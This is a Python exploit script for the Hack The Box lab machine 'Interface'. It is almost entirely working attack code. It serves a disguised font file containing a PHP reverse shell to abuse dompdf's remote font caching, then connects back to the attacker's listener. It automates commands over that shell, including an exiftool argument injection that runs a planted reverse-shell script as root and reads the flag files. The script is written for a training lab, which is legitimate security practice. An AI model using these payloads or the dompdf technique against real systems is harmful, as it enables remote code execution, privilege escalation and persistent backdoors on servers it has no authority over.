# Python automatic exploit script for "Interface" on hackthebox. https://app.hackthebox.com/machines/527
from http.server import BaseHTTPRequestHandler, HTTPServer
from multiprocessing import Process, Pipe
from functools import cache 
import time
import netifaces
import requests
import hashlib
import socket
import uuid

serverIp = netifaces.ifaddresses('tun0')[netifaces.AF_INET][0]['addr'] 
serverPort = 8000
fontName = uuid.uuid1().hex
md5HashRemoteUrl = hashlib.md5((f"http://{serverIp}:8000/{fontName}.php").encode("utf-8")).hexdigest()

class ExploitServer(BaseHTTPRequestHandler):

    font = (b'\x00\x01\x00\x00\x00\n\x00\xef\xbf\xbd\x00\x03\x00 dum1'
           b'\x00\x00\x00\x00\x00\x00\x00\xef\xbf\xbd\x00\x00\x00\x02cmap'
           b'\x00\x0c\x00`\x00\x00\x00\xef\xbf\xbd\x00\x00\x00,glyf5sc'
           b'\xef\xbf\xbd\x00\x00\x00\xef\xbf\xbd\x00\x00\x00\x14head'
           b'\x07\xef\xbf\xbdQ6\x00\x00\x00\xef\xbf\xbd\x00\x00\x006hhea'
           b'\x00\xef\xbf\xbd\x03\xef\xbf\xbd\x00\x00\x01(\x00\x00\x00$hmtx'
           b'\x04D\x00\n\x00\x00\x01L\x00\x00\x00\x08loca\x00\n\x00\x00\x00\x00\x01T'
           b'\x00\x00\x00\x06maxp\x00\x04\x00\x03\x00\x00\x01\\\x00\x00\x00 name\x00D'
           b'\x10\xef\xbf\xbd\x00\x00\x01|\x00\x00\x008dum2\x00\x00\x00\x00\x00\x00\x01'
           b'\xef\xbf\xbd\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\x01\x00\x03\x00'
           b'\x01\x00\x00\x00\x0c\x00\x04\x00 \x00\x00\x00\x04\x00\x04\x00\x01\x00\x00\x00-'
           b'\xef\xbf\xbd\xef\xbf\xbd\x00\x00\x00-\xef\xbf\xbd\xef\xbf\xbd\xef\xbf\xbd\xef'
           b'\xbf\xbd\x00\x01\x00\x00\x00\x00\x00\x01\x00\n\x00\x00\x00:\x008\x00\x02\x00\x003#5:08'
           b'\x00\x01\x00\x00\x00\x01\x00\x00\x17\xef\xbf\xbd\xef\xbf\xbd\x16_\x0f<\xef\xbf\xbd\x00\x0b\x00@'
           b'\x00\x00\x00\x00\xef\xbf\xbd\x158\x06\x00\x00\x00\x00\xef\xbf\xbd&\xdb\xbd\x00\n\x00\x00\x00:\x008'
           b'\x00\x00\x00\x06\x00\x01\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00L\xef\xbf\xbd\xef\xbf\xbd\x00'
           b'\x12\x04\x00\x00\n\x00\n\x00:\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           b'\x02\x04\x00\x00\x00\x00D\x00\n\x00\x00\x00\x00\x00\n\x00\x00\x00\x01\x00\x00\x00\x02\x00\x03\x00'
           b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
           b'\x00\x00\x04\x006\x00\x03\x00\x01\x04\t\x00\x01\x00\x02\x00\x00\x00\x03\x00\x01\x04\t\x00\x02\x00'
           b'\x02\x00\x00\x00\x03\x00\x01\x04\t\x00\x03\x00\x02\x00\x00\x00\x03\x00\x01\x04\t\x00\x04\x00\x02'
           b'\x00\x00\x00s\x00\x00\x00\x00\n')

    def serve_exploit_css(self, fileName):
        self.send_response(200)
        self.send_header("Content-type", "text/css")
        self.end_headers()
        self.wfile.write("@font-face {".encode("utf-8"))
        self.wfile.write(f" font-family:'{fileName}';".encode("utf-8"))
        self.wfile.write(f" src:url('http://{serverIp}:8000/{fileName}.php');".encode("utf-8"))
        self.wfile.write(" font-weight:'normal';".encode("utf-8"))
        self.wfile.write(" font-style:'normal';".encode("utf-8"))
        self.wfile.write("}".encode("utf-8"))
        print("Server requested CSS")

    def serve_exploit_font_php(self, PORT):
        self.send_response(200)
        self.send_header("Content-type", "text/css")
        self.end_headers()
        self.wfile.write(self.font + f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{serverIp}/{PORT} 0>&1'\");".encode("utf-8"))
        print("Server requested font")

    def do_GET(self):
        if self.path == f"/{fontName}.css":
            self.serve_exploit_css(fontName)
        elif self.path == f"/{fontName}.php":
            self.serve_exploit_font_php(1336);

    def log_message(self, format, *args):
        return

def shell(name, shellMarker, PORT, commands):
    commandNo = -1
    result = []
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(("0.0.0.0", PORT))
        s.listen()
        conn, addr = s.accept()
        with conn:
            shouldContinue = True
            while shouldContinue:
                data = conn.recv(1024)
                if not data:
                    break;
                lines = data.decode("utf-8").splitlines()

                for line in lines:
                    if len(line.strip()) > 0 and line.strip()[-1] == shellMarker:
                        if commandNo >= 0:
                            commands[commandNo][1](result)
                        else:
                            print(f"Reverse shell \"{name}\" connected...")
                        if(commandNo >= len(commands) - 1):
                            shouldContinue = False
                        else:
                            commandNo = commandNo + 1
                            result = []
                            conn.sendall(f"{commands[commandNo][0]}\n".encode("utf-8"))
                    else: 
                        result.append(line)   

def main():
    
    def host():
        webServer.serve_forever()

    def reverse_user_shell():
        shell("user", '$',  1336, [['cat /home/dev/user.txt', lambda result : userSender.send(result[3])],
                           ['mkdir /tmp/...', lambda _ : None],
                           [f'echo "/bin/bash -i >& /dev/tcp/{serverIp}/1337 0>&1" > /tmp/.../exploit.sh', lambda _ : None],
                           ['chmod +x /tmp/.../exploit.sh', lambda _ : None],
                           ['rm /tmp/jamaica.jpg', lambda _ : None],
                           ['/usr/bin/exiftool -Producer=\'a[$(/tmp/.../exploit.sh>&2)]+42\' /var/www/api/vendor/dompdf/dompdf/tests/_files/jamaica.jpg -o /tmp/jamaica.jpg', lambda _ :None]])

    def reverse_root_shell():
        shell("root", '#', 1337, [["cat /root/root.txt", lambda result : rootSender.send(result[2])],
                           ["rm -rf /tmp/...", lambda _ : None],
                           [f"rm /var/www/vendor/dompdf/dompdf/lib/fonts/{fontName}_normal_{md5HashRemoteUrl}.php"]])


    userReceiver, userSender = Pipe()
    rootReceiver, rootSender = Pipe()
    webServer = HTTPServer(("0.0.0.0", serverPort), ExploitServer)
    
    
    
    host = Process(target=host)
    host.start()
    print("Exploitserver started...")   
    usershell = Process(target=reverse_user_shell)
    usershell.start()
    print("Listening for user shell...")
    rootShell = Process(target=reverse_root_shell)
    rootShell.start()
    print("Listening for root shell...")
    
    try:
        time.sleep(.5)
        url = 'http://prd.m.rendering-api.interface.htb/api/html2pdf'
        myobj = {'html': f"<link rel=stylesheet href='http://{serverIp}:8000/{fontName}.css'>"}
        requests.post(url, json = myobj)
        time.sleep(.5)
        url = f'http://prd.m.rendering-api.interface.htb/vendor/dompdf/dompdf/lib/fonts/{fontName}_normal_{md5HashRemoteUrl}.php'
        requests.get(url)
        print(f"User.txt: {userReceiver.recv()}")
        print(f"Root.txt: {rootReceiver.recv()}")
    except:
        pass
    finally:
        webServer.server_close()
        host.terminate()
        usershell.terminate()
        rootShell.terminate()
        userReceiver.close()
        userSender.close()
        rootReceiver.close()
        rootSender.close()
        print("Exploitserver stopped.")

if __name__ == "__main__":
    main()
    
